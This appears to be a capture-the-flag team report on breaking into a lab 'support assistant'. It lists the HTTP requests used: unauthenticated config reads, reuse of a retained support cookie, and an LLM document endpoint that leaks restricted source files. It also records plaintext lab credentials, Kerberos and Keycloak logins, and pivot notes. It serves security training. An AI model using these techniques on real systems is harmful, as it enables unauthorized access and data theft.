# Lane K21 — FINAL REPORT

Chapter K21 ("support assistant") is **COMPLETE**. All three flags submitted and accepted.

| Challenge | Flag | How |
|---|---|---|
| K21.1 The policy beside the prompt (50p) | `FLAG{bda988856f374cc1}` | `GET https://assistant.keplerops.test/api/config` (unauth) + `GET /api/workspaces`; policy reference in `openAiPrompt`; restricted context = workspace `support-private` / context id `ctx-support-private-v4` |
| K21.2 A conversation kept too long (50p) | `FLAG{302e391567fb7188}` | `GET /api/conversations/CONV-SUP-2841-19` with `Cookie: fieldkest_support=<support token>` — `deleted_from_ui:true`, contains restricted ESC-SUP-2841-R3 / DIAG-CRR-MIXED-19 detail |
| K21.3 The answer it should withhold (100p) | `FLAG{0613dee9e717f1e3}` | `GET /api/contexts/ctx-support-private-v4/conversations/CONV-SUP-2841-19/documents/DOC-RILL-442` with the same cookie → `sources[]` leaks full `ESC-SUP-2841-R3.md`; updated copy (published 1:43:16 PM) has `Audit Reference: Completion token: FLAG{0613dee9e717f1e3}` |

## Service map discovered (assistant.keplerops.test)

nginx vhost muxes two backends:
- AnythingLLM (Express; `/index.js`, `/api/workspaces`, `/api/workspace/<slug>/...`, `/api/request-token`, `/api/setup-complete`).
- A custom **FieldKest/1.0 Python/3.12** "support assistant" overlay for specific `/api/*` routes.

Overlay client reference: `GET https://assistant.keplerops.test/.well-known/fieldkest-client`
```
purpose: Browser application, conversation, answer, and completion operations.
routes:
 assistant.app                  GET  /static/app.js
 assistant.config               GET  /api/config
 assistant.contexts             GET  /api/contexts
 assistant.conversation         GET  /api/conversations/{conversation_id}
 assistant.selection            GET  /api/selections/{selection_id}
 assistant.document             GET  /api/contexts/{context_id}/conversations/{conversation_id}/documents/{document_id}
 assistant.answers              POST /api/answers
 assistant.completion-example   GET  /api/completions/examples/{example_id}
 assistant.completion-context   POST /api/completions/context
 assistant.completion-jobs      POST /api/completions/jobs
 assistant.completion-job       GET  /api/completions/jobs/{job_id}
 assistant.accept-duplicate-review POST /api/tools/accept-duplicate-review
```

### Overlay authentication (the key trick)
The overlay's "session" is simply the retained support integration token sent as a cookie:
```
Cookie: fieldkest_support=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b
```
Bearer headers, the AnythingLLM JWT, Basic auth, Kerberos (`--negotiate`) and Keycloak
tokens all fail with `{"error":"session_required"}`; only the `fieldkest_support` cookie works.
The token is in `/home/rowan/.config/fieldlink/support-client.json` and in the retained
Chromium cookie DB (`support.keplerops.test`, cookie name `fieldkest_support`).

## Open (no session) overlay data
- `GET /api/config` → collection/context/policy + `answer_requests` (`compatibility_review`,
  `private_escalation`), `completion.example=COMP-JOB-17`, `tool_request.review_id=DREV-2841-2`.
- `GET /api/contexts` → support-private: conversations `[CONV-SUP-2841-19]`,
  documents `[DOC-RILL-442]`, selections `[SEL-SUP-2841-12]`, `answer_thread`
  `2ddf90fa-67b2-4637-a1d9-19404b7bc234`, published:false; rill-support: `[CONV-RILL-442-8]`.

## Session-protected overlay data collected with the cookie
- `CONV-SUP-2841-19` → `FLAG{302e391567fb7188}` (K21.2). Messages: user asks for escalation
  reference; assistant answers `ESC-SUP-2841-R3 (restricted)`, `DIAG-CRR-MIXED-19`,
  connector FLK-7.4.2, asset CRR-OG2.
- `CONV-RILL-442-8` → `FLAG{25723607dbdb5768}` (not a K21 card — leave for its owner;
  Rillhaven TEN-RILL-022, asset RILL-PUMP-442, doc RILL-442).
- `SEL-SUP-2841-12` → attachment ATT-DIAG-698, case SUP-2841, tenant TEN-ARWC-047.
- `COMP-JOB-17` → `FLAG{664724eb7d7073e9}` completion token; handover HANDOVER-COMP-2841,
  credential cred-completion-handover, runs as svc-assistant-completion, context root
  support-examples (not K21; likely a completion/jobs card).
- `GET /api/contexts/.../documents/<any id>` returns an LLM answer + `sources[]` with the
  full chunk text of the workspace docs (ESC-SUP-2841-R3.md, COMP-JOB-17.md). The second
  ESC-SUP-2841-R3 copy leaks `FLAG{0613dee9e717f1e3}` (K21.3).

`POST /api/answers` (`{"request":"private_escalation", context_id, conversation_id, tenant_id}`)
returns 502 `retrieval_failed`; `POST /api/completions/context` returns 403
`context_ownership_denied`; `POST /api/tools/accept-duplicate-review` returns 403
`prerequisite_incomplete`. Not needed for K21 but may matter for later cards.

## AnythingLLM details
- `GET /api/setup-complete` (unauth) reveals full config: StorageDir /app/server/storage,
  lancedb, Ollama at http://fieldlink-ollama:11434, model fieldlink-qwen:latest, MultiUserMode.
- Users: id2 `rowan.ito` (role default, password = `fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo`),
  id3 `maya.ranscombe` (role default, password `sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk`).
  Tokens via `POST /api/request-token`. Workspaces `fieldlink-operations`, `support-private`,
  `rillhaven-support`; every workspace has `chatMode:"automatic"` so chat swaps to agent
  websocket and cannot be changed (workspace update = 401 for default role).
- Anyone can `POST /api/workspace/<slug>/thread/new`, but `.../thread/<slug>/chats` is
  user-scoped; the retained `answer_thread` 2ddf90fa-… is not owned by rowan/maya
  (404 "Workspace thread does not exist"), which is why the Python overlay is the way in.
- Workspace docs (support-private): ESC-SUP-2841-R3.md (two versions), ATT-DIAG-698.md,
  COMP-JOB-17.md. `GET /api/workspace/<slug>/document/<id>` does not exist.

## Adjacent findings (NOT submitted — belong to other cards)
- `GET https://staff.keplerops.test/api/service-directory` with Basic
  `rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo` →
  `{"archive_subject":"evan.calderoux@keplerops.test",
    "enrollment":"https://staff.keplerops.test/api/enrollment/StaffArchiveUser",
    "enrollment_worker":"fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9",
    "restricted_note":"NOTE-SUP-2841-7","support_registration":"OIDC-FIELDKEST-SUPPORT"}`
- `GET /api/notes/NOTE-SUP-2841-7` (same Basic auth) → staff-note draft about ARWC
  CRR-OG2, `FLAG{3177559b5e2a80d8}`, restricted:true, status:draft.
- `GET https://support.keplerops.test:8443/api/handovers/current` with support Bearer →
  `FLAG{12791115ad005ed7}` (already K02.3 per k02 report).
- Staff `POST /api/managed-identities/<svc>/session` returns `WWW-Authenticate: Negotiate`.
  Kerberos works: `echo '<fk_developer token>' | kinit rowan.ito` (realm KEPLEROPS.TEST,
  kdc kerberos.keplerops.test) succeeds; with a TGT the endpoint returns
  `{"error":"managed_identity_denied"}` for every service id tried (assistant, support,
  OIDC-FIELDKEST-SUPPORT, workspace, objects, data, cloud-api, …). Staff archive routes
  return `{"error":"client_cert_required"}`; enrollment template `StaffArchiveUser`
  (eku clientAuth, provisioner fieldkest-enrollment,
  requests at /api/enrollment/StaffArchiveUser/requests). These are likely K22/identity cards.
- Keycloak realm `keplerops` at identity.keplerops.test allows password grant with
  `client_id=admin-cli` for rowan.ito/fk_developer (token has only scope email profile, no
  admin roles; admin REST and token-exchange are denied). `OIDC-FIELDKEST-SUPPORT` is a
  registered client but not usable with direct grants.

## Dead ends / notes
- `sudo` is NOT available on rowan-dev as the `rowan` user (contrary to the box); use plain
  `kinit`. Passwordless sudo is only on the range box.
- SSH `-D` SOCKS does not work; all traffic via the existing 127.0.0.1:1080 pivot on the box
  or directly from rowan-dev (10.50.13.180), which reaches 10.77.0.0/16 services natively.
- No usable AnythingLLM admin account; `admin:admin`, `rowan.ito:<anything but dev token>`
  all fail. Agent websocket protocol was not needed.
- The overlay's OPTIONS returns a Python `http.server` 501; the service is a custom
  FieldKest/1.0 Python app (same family as indexer/review/staff/support well-known services).
